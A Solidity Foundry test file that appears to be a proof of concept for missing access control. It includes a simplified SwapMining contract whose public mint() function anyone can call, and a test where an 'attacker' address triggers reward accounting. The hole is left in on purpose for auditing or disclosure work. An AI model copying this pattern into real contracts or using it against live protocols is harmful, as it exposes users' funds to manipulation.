pragma solidity 0.8.20;

import "forge-std/Test.sol";

contract SwapMining {
    // minimal state touched by the PoC
    uint256 public babyPerBlock;
    uint256 public totalAllocPoint;
    uint256 public startBlock;

    struct PoolInfo {
        uint256 allocPoint;
        uint256 allocMdxAmount;
        uint256 lastRewardBlock;
    }

    PoolInfo[] public poolInfo;

    constructor(uint256 _babyPerBlock) {
        babyPerBlock = _babyPerBlock;
        startBlock = block.number;
    }

    // helper to create a pool in tests (not owner-restricted here for simplicity)
    function addPool(uint256 _allocPoint) public {
        totalAllocPoint += _allocPoint;
        // set lastRewardBlock in the past so mint will consider there are rewards
        uint256 lastRewardBlock = block.number - 1;
        poolInfo.push(PoolInfo({allocPoint: _allocPoint, allocMdxAmount: 0, lastRewardBlock: lastRewardBlock}));
    }

    // simplified reward calculation: linear reward since lastRewardBlock
    function getBabyReward(uint256 _lastRewardBlock) public view returns (uint256) {
        require(_lastRewardBlock <= block.number, "must be <= current block");
        if (block.number <= _lastRewardBlock) return 0;
        return (block.number - _lastRewardBlock) * babyPerBlock;
    }

    // Vulnerable public function: no access control
    function mint(uint256 _pid) public returns (bool) {
        PoolInfo storage pool = poolInfo[_pid];
        if (block.number <= pool.lastRewardBlock) {
            return false;
        }
        uint256 blockReward = getBabyReward(pool.lastRewardBlock);
        if (blockReward <= 0) {
            return false;
        }
        uint256 mdxReward = blockReward * pool.allocPoint / totalAllocPoint;
        pool.allocMdxAmount = pool.allocMdxAmount + mdxReward;
        pool.lastRewardBlock = block.number;
        return true;
    }
}

contract SwapMiningTest is Test {
    SwapMining target;
    address attacker;

    function setUp() public {
        target = new SwapMining(10);
        // create a pool with non-zero allocPoint
        target.addPool(100);
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_mint() public {
        // advance one block so block.number > pool.lastRewardBlock
        vm.roll(block.number + 1);
        vm.prank(attacker);
        bool res = target.mint(0);
        assertTrue(res, "mint should succeed when called by anyone");
        (uint256 allocPoint, uint256 allocMdxAmount, uint256 lastRewardBlock) = target.poolInfo(0);
        // allocMdxAmount should have increased and lastRewardBlock updated to current block
        assertGt(allocMdxAmount, 0);
        assertEq(lastRewardBlock, block.number);
    }
}

